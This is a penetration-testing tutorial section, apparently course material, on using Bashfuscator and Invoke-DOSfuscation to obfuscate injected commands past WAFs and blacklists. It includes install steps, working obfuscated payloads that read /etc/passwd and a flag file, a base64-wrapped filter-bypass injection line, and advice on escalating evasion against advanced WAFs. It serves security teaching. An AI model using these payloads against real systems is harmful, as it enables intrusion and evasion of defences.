## Evasion Tools

Manual obfuscation works well against application-level blacklists, but sophisticated WAFs with signature databases and heuristic analysis require a different approach. Automated obfuscation tools apply multiple layered transformation techniques simultaneously, producing outputs that no human would write naturally and that are far less likely to match any known signature.

***

## Bashfuscator (Linux)

[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) is a modular bash obfuscation framework that applies chained transformation techniques including token manipulation, character encoding, variable expansion, arithmetic substitution, and command reversal in combination. 

**Installation:**

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin/
```

**Basic usage (random obfuscation):**

```bash
./bashfuscator -c 'cat /etc/passwd'
# Randomly picks techniques, may produce 1000+ character payload
```

**Controlled output (shorter, more usable payload):**

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

The flags that matter:

| Flag | Meaning |
|------|---------|
| `-s 1` | Payload size target (1 = smallest) |
| `-t 1` | Token obfuscation level (1 = least complex) |
| `--no-mangling` | Disables variable name randomisation |
| `--layers 1` | Single obfuscation layer (less nesting) |
| `-l` | Lists all available obfuscators, compressors, encoders |

A typical output using those flags looks like:

```bash
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

This uses an indexed array containing individual characters and a loop that prints them in a specific order, reconstructing `cat /etc/passwd` entirely from array lookups. No filtered keyword appears in the payload at all.

**Testing the output before sending:**

Always verify the obfuscated payload executes correctly locally before using it against a target:

```bash
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
# Should output /etc/passwd contents
```

**Making it work with a space-filtered target:**

Bashfuscator's output may still contain spaces. After generating the payload, replace spaces with `${IFS}` or `%09` before injecting:

```bash
# Check for spaces in output
./bashfuscator -c 'whoami' -s 1 -t 1 --no-mangling --layers 1 | cat -A
# Pipe to cat -A to see whitespace characters marked with $

# The eval wrapper itself uses spaces - obfuscate those too
# Or wrap the entire output in base64 as a final layer:
PAYLOAD=$(./bashfuscator -c 'whoami' -s 1 -t 1 --no-mangling --layers 1)
echo -n "$PAYLOAD" | base64
# Then inject: bash<<<$(base64%09-d<<<BASE64_STRING)
```

***

## DOSfuscation (Windows)

[Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) is an interactive PowerShell tool that obfuscates Windows CMD commands using environment variable substring extraction, binary path manipulation, and encoding techniques. 

**Installation and launch:**

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

On Linux with `pwsh` installed, the same commands work identically since this is a PowerShell module.

**Interactive workflow:**

```
# Step 1: Set the command to obfuscate
Invoke-DOSfuscation> SET COMMAND whoami

# Step 2: Choose an obfuscation category
Invoke-DOSfuscation> ENCODING

# Step 3: Select encoding type
Invoke-DOSfuscation\Encoding> 1

# Output: obfuscated command using %TEMP%, %TMP%, %WINDIR% substrings
```

**Available obfuscation categories:**

```
BINARY      Replaces command path with environment variable paths to cmd.exe/powershell.exe
ENCODING    Substitutes command characters with environment variable substrings
PAYLOAD     Combines multiple techniques for full command obfuscation
TUTORIAL    Walks through a working example
```

A typical ENCODING output looks like:

```cmd
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

CMD expands each `%VAR:~start,length%` token to its corresponding character, reconstructing the original `type C:\Users\htb-student\Desktop\flag.txt` command at execution time. No recognisable keyword like `type` or `C:\Users` appears anywhere in the obfuscated string.

***

## Choosing Between Manual and Automated Obfuscation

```
Basic application blacklist (PHP in_array checks):
    Manual techniques are faster and more predictable
    Case manipulation, reversal, or base64 usually sufficient
    Easier to debug when something breaks

Moderate WAF (ModSecurity, Cloudflare basic rules):
    Start manual, escalate to Bashfuscator if blocked
    Use --layers 1 output, verify locally first
    May need to combine with space/character bypasses

Advanced WAF (commercial, ML-based, signature + behaviour):
    Bashfuscator with multiple layers
    Layer base64 on top of Bashfuscator output
    Unique per-engagement payloads defeat signature matching
    Consider blind injection with time delays to avoid output-based detection
```

The most important operational habit with either tool is local verification before target use. An obfuscated payload that fails silently on the target is harder to debug than one you tested beforehand. Running the Bashfuscator output through `bash -c '...'` locally confirms execution before you spend time troubleshooting filter issues that are actually syntax errors in the obfuscated output.
